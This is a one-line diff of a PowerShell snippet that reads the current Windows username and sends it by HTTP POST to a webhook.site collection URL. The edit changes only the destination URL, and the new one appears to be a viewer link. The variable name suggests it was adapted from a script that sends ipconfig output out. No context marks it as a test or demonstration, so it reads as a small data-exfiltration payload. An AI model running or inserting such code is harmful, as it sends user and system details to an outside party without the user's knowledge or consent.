@@ -1,1 +1,1 @@
-$ipconfigOutput = "You are logged in as $env:USERNAME" | Out-String ;; Invoke-WebRequest -Uri https://webhook.site/0592162d-7347-4826-9480-9b3988be7336 -Method POST -Body $ipconfigOutput
+$ipconfigOutput = "You are logged in as $env:USERNAME" | Out-String ;; Invoke-WebRequest -Uri https://webhook.site/#!/view/7e6ace7c-1673-44b9-a9be-7976f0cec7fb -Method POST -Body $ipconfigOutput
